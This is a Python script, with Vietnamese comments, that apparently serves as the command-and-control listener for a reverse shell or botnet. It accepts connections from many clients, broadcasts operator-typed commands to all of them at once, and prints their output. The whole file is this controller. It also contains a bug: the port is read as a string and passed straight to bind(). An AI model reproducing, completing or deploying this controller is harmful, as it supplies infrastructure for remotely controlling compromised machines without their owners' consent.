import socket
import threading

SERVER = "0.0.0.0"
PORT = input('Port >>> ')

# Khởi tạo server socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))
s.listen(5)

clients = []  # Danh sách các kết nối client
lock = threading.Lock()  # Khóa để đồng bộ hóa truy cập vào danh sách clients

def handle_client(client_socket, address):
    print(f'[+] client connected {address}')
    client_socket.send('connected'.encode())
    
    while True:
        try:
            result = client_socket.recv(1024).decode()
            if not result:
                break
            
            # Kiểm tra nếu nội dung bắt đầu bằng '[ayuly]'
            if result.startswith('[ayuly1723]'):
                # Xóa '[ayuly]' và in phần còn lại
                result = result[len('[ayuly1723]'):]
                print(f'[Client {address}]: {result}')
            else:
                print(f'[Client {address}]: {result}')
                
        except ConnectionResetError:
            print(f'[-] client {address} disconnected')
            break

    with lock:
        clients.remove(client_socket)
    client_socket.close()

def accept_clients():
    print(f'[*] listening as {SERVER}:{PORT}')
    while True:
        client_socket, client_address = s.accept()
        with lock:
            clients.append(client_socket)
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

def send_commands():
    while True:
        cmd = input('>>> ')
        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            with lock:
                for client in clients:
                    try:
                        client.send(cmd.encode())
                    except Exception as e:
                        print(f'[!] Error sending command to client {client.getpeername()}: {e}')
            break
        
        with lock:
            for client in clients:
                try:
                    client.send(cmd.encode())
                except Exception as e:
                    print(f'[!] Error sending command to client {client.getpeername()}: {e}')

accept_thread = threading.Thread(target=accept_clients)
accept_thread.start()

send_commands()

s.close()
